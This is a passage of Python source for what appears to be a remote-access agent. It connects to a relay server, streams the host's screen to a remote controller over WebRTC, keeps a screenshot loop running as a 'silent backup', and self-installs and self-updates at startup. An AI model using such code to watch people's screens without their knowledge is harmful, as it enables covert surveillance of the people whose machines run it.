                'agent:response',
                {
                    'controllerId': data.get('controllerId'),
                    'deviceId': device_id,
                    'type': 'file:error',
                    'error': str(e),
                },
            )

# ---- at module level (put this near your other globals, NOT inside the handler) ----
offer_lock = asyncio.Lock()


@sio.on('webrtc:offer')
async def on_offer(data):
    global pc, active_monitor_index, current_track, controller_id_global
    log.info("[WEBRTC] Offer received")

    cid = data.get('controllerId')
    if cid:
        controller_id_global = cid

    if not WEBRTC_AVAILABLE:
        log.info("[SCREEN] Forcing mss mode for this session")
        if not controller_id_global:
            return
        await sio.emit('agent:response', {
            'controllerId': controller_id_global,
            'deviceId': device_id,
            'output': '[FALLBACK] WebRTC unavailable, using screenshot mode',
            'type': 'screen:fallback'
        })
        await sio.emit('agent:screen:mode', {
            'deviceId': device_id,
            'controllerId': controller_id_global,
            'mode': 'screenshot'
        })
        return

    async with offer_lock:
        if not env['can_capture']:
            await sio.emit('agent:response', {
                'controllerId': controller_id_global,
                'deviceId': device_id,
                'output': '[FALLBACK] Screen capture unavailable.'
            })
            return

        # tear down any previous session
        if current_track:
            try:
                current_track.stop_capture()
            except Exception:
                pass
            current_track = None

        if pc:
            old_pc, pc = pc, None
            try:
                await old_pc.close()
            except Exception:
                pass

        pc = RTCPeerConnection(configuration=ICE_SERVERS)
        video_track = ScreenTrack(monitor_index=active_monitor_index)
        current_track = video_track
        pc.addTrack(video_track)
        log.info("[WEBRTC] Track added, creating answer...")

        try:
            pending_ice.clear()

            @pc.on('icecandidate')
            async def on_icecandidate(candidate):
                if candidate is None:
                    return
                try:
                    await sio.emit('webrtc:ice', {
                        'candidate': {
                            'candidate': candidate.candidate,
                            'sdpMid': candidate.sdpMid,
                            'sdpMLineIndex': candidate.sdpMLineIndex,
                        },
                        'controllerId': controller_id_global,
                        'target': 'controller',
                    })
                except Exception as e:
                    log.warning("[WEBRTC] ice emit failed: %s", e)

            @pc.on('connectionstatechange')
            async def on_connectionstatechange():
                log.info("[WEBRTC] connectionState=%s", pc.connectionState if pc else None)

            await pc.setRemoteDescription(
                RTCSessionDescription(sdp=data['offer']['sdp'], type=data['offer']['type'])
            )
            # flush any ICE that arrived early
            if pending_ice:
                for cand in list(pending_ice):
                    try:
                        await pc.addIceCandidate(cand)
                    except Exception:
                        pass
                pending_ice.clear()

            answer = await pc.createAnswer()
            await pc.setLocalDescription(answer)
            log.info("[WEBRTC] Sending answer")
            await sio.emit('webrtc:answer', {
                'answer': {'sdp': pc.localDescription.sdp, 'type': pc.localDescription.type},
                'controllerId': controller_id_global,
            })
        except Exception as e:
            log.warning("[WEBRTC] offer error: %s", e)
            if pc:
                try:
                    await pc.close()
                except Exception:
                    pass
                pc = None




@sio.on('webrtc:ice')
async def on_ice(data):
    if not WEBRTC_AVAILABLE:
        return

    cand_data = data.get('candidate')
    if not cand_data:
        return

    cand_str = cand_data.get('candidate', '')
    # An empty candidate string is the end-of-candidates marker — not an error.
    if not cand_str or 'candidate:' not in cand_str:
        return

    try:
        candidate = candidate_from_sdp(cand_str.split(':', 1)[1])
        candidate.sdpMid = cand_data.get('sdpMid')
        candidate.sdpMLineIndex = cand_data.get('sdpMLineIndex')
    except Exception as e:
        log.warning("[WEBRTC] could not parse ICE candidate: %s", e)
        return

    # Not ready yet — hold it rather than dropping it.
    if pc is None or pc.remoteDescription is None:
        pending_ice.append(candidate)
        log.debug("[WEBRTC] buffered ICE candidate (%d pending)", len(pending_ice))
        return

    try:
        await pc.addIceCandidate(candidate)
    except Exception as e:
        log.warning("[WEBRTC] addIceCandidate failed: %s", e)


async def main():
    global main_loop, offer_lock
    main_loop = asyncio.get_running_loop()
    offer_lock = asyncio.Lock()

    asyncio.create_task(monitor_screen_state())
    asyncio.create_task(keepalive())
    asyncio.create_task(loop_health())        # always on, for diagnosing drops
    # Always run screenshot backbone — used when WebRTC is down or as silent backup.
    asyncio.create_task(screenshot_loop())

    try:
        with open(os.path.join(CONFIG_DIR, 'last_connect.log'), 'w') as f:
            f.write(f'{time.time()}')
    except Exception:
        pass

    while True:
        try:
            print(f'[MAIN] Connecting to {config["relay"]}...')
            await sio.connect(
                config['relay'],
                transports=['websocket', 'polling'],
                wait_timeout=10,
            )
            await sio.wait()   # blocks here; Socket.IO auto-reconnects internally
        except Exception as e:
            print(f'[MAIN] Connect failed: {e}')
            await asyncio.sleep(5)
        else:
            await asyncio.sleep(2)


if __name__ == '__main__':
    import traceback
    try:
        self_install()
        check_for_update()
        print('[BOOT] starting main...')
        asyncio.run(main())
    except SystemExit:
        # Normal quit (install / update / uninstall). Just leave.
        raise
    except Exception as e:
        print(f'[BOOT CRASH] {type(e).__name__}: {e}')
        traceback.print_exc()
        # No input() — never hang waiting for Enter
        sys.exit(1)
